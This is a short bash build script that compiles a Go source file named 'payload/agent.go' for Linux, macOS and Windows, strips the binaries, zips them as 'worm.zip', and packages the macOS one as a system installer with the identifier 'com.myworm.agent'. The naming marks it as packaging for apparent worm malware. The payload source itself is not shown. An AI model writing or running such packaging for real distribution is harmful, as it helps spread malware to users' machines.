set -euo pipefail
ROOT_DIR="$(cd "$(dirname "$0")" && pwd)"
RELEASE_DIR="$ROOT_DIR/release"
PAYLOAD_SRC="$ROOT_DIR/payload/agent.go"
mkdir -p "$RELEASE_DIR"
GOOS=linux GOARCH=amd64 go build -ldflags "-s -w" -o "$RELEASE_DIR/agent-linux-amd64" "$PAYLOAD_SRC"
GOOS=darwin GOARCH=amd64 go build -ldflags "-s -w" -o "$RELEASE_DIR/agent-darwin-amd64" "$PAYLOAD_SRC"
GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" -o "$RELEASE_DIR/agent-windows-amd64.exe" "$PAYLOAD_SRC"
(cd "$RELEASE_DIR" && zip -j worm.zip agent-linux-amd64 agent-darwin-amd64 agent-windows-amd64.exe)
PKG_ROOT="$RELEASE_DIR/pkgroot"
mkdir -p "$PKG_ROOT/usr/local/bin"
cp "$RELEASE_DIR/agent-darwin-amd64" "$PKG_ROOT/usr/local/bin/agent"
pkgbuild --root "$PKG_ROOT" --identifier "com.myworm.agent" --version "1.0" --install-location "/usr/local/bin" "$RELEASE_DIR/myworm.pkg"
echo "[+] Build complete: $RELEASE_DIR/myworm.pkg and $RELEASE_DIR/worm.zip"